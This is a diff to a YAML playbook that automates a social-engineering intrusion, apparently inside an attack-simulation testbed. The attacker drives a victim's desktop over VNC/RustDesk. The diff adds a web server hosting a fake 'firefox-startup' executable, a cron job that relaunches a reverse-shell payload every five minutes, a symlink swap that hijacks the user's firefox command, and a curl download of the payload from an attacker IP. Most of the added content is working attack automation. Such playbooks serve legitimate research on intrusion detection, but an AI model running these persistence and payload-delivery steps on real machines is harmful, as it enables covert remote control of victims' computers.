@@ -28,7 +28,19 @@ commands:
     cmd: "ssh -i /home/aecid/.ssh/attacker  -o StrictHostKeyChecking=no -L 5902:$CLIENT_IP:$CLIENT_VNC_PORT $MGMT_USERNAME@$MGMT_IP \n"
 
 
-################### PREPARE REVERSE SHELL PAYLOAD ############################
+
+################### SERVE THE FAKE EXECUTABLE ############################
+
+  # serve payload via http
+  - type: webserv
+    local_path: /home/aecid/firefox-startup
+    port: 8082
+    background: True
+
+  - type: sleep
+    seconds: 3
+
+
 
   # tempfile for reverse shell payload
   - type: mktemp
@@ -110,7 +122,7 @@ commands:
     session: social_engineering
 
   - type: sleep
-    seconds: 30
+    seconds: 45
 
   - type: vnc 
     cmd: type 
@@ -123,7 +135,7 @@ commands:
     session: social_engineering
   
   - type: sleep
-    seconds: 30
+    seconds: 45
 
   - type: vnc
     cmd: type
@@ -504,7 +516,7 @@ commands:
     session: attacker
 
   - type: sleep
-    seconds: 10
+    seconds: 7
 
   - type: vnc
     cmd: type
@@ -512,7 +524,7 @@ commands:
     session: attacker
     
   - type: sleep
-    seconds: 10
+    seconds: 7
 
   - type: vnc
     cmd: key
@@ -520,7 +532,7 @@ commands:
     session: attacker
 
   - type: sleep
-    seconds: 10
+    seconds: 7
 
  # open rustdesk with client id and client  from the terminal
   - type: vnc 
@@ -555,9 +567,45 @@ commands:
     session: social_engineering
 
   - type: sleep
-    seconds: 10
+    seconds: 5
 
 ## attackers interactions via screenshares on the client desktop
+# select the vnc tab
+
+  - type: vnc
+    cmd: move
+    x: 581
+    y: 754
+    session: attacker
+
+  - type: sleep
+    seconds: 3
+
+  - type: vnc
+    cmd: click
+    session: attacker
+
+  - type: sleep
+    seconds: 5
+
+# click into the open client terminal on the client screen
+
+
+  - type: vnc
+    cmd: move
+    x: 200
+    y: 200
+    session: attacker
+
+  - type: sleep
+    seconds: 3
+
+  - type: vnc
+    cmd: click
+    session: attacker
+
+  - type: sleep
+    seconds: 5
 # download fake install script
 
   - type: vnc
@@ -593,14 +641,65 @@ commands:
   - type: sleep
     seconds: 1
 
-# set up a cronjob that executes the script
+##### OPTION 1 ######## set up a cronjob that executes the reverse shell
 
+# TODO check escaped characters
   - type: vnc
     cmd: type
     input: "(crontab -l 2>/dev/null; echo \"*/5 * * * * /bin/bash -c '/tmp/index &'\") | crontab -"
     session: attacker
   
     
+  - type: sleep
+    seconds: 1
+
+  - type: vnc
+    cmd: key
+    key: "enter"
+    session: attacker
+
+  - type: sleep
+    seconds: 3
+
+#### OPTION 2 set up a fake firefox binary that executes the reverse shell and then the actual firefox
+## change the symlink in .local/bin from the actual firefox to the fake firefox binary
+
+  - type: vnc
+    cmd: type
+    input: "ln -sf /home/judy/.local/share/firefox/firefox-startup /home/judy/.local/bin/firefox"
+    session: attacker
+
+  - type: sleep
+    seconds: 1
+
+  - type: vnc
+    cmd: key
+    key: "enter"
+    session: attacker
+
+  - type: sleep
+    seconds: 3
+
+## download the fake executable from attacker webserver
+
+  - type: vnc
+    cmd: type
+    input: "curl -o /home/judy/.local/share/firefox/firefox-startup 192.42.1.174:8082/index"
+    session: attacker
+
+  - type: sleep
+    seconds: 1
+
+  - type: vnc
+    cmd: key
+    key: "enter"
+    session: attacker
+
+  - type: vnc
+    cmd: type
+    input: "chmod +x /home/judy/.local/share/firefox/firefox-startup"
+    session: attacker
+
   - type: sleep
     seconds: 1
 
@@ -695,7 +794,7 @@ commands:
 #    background: true
 #    kill_on_exit: true
 #
-## get access to client machine to execute the malicious install.sh script
+#
 #
 #  # run commands via reverse shell
 #  - type: msf-session
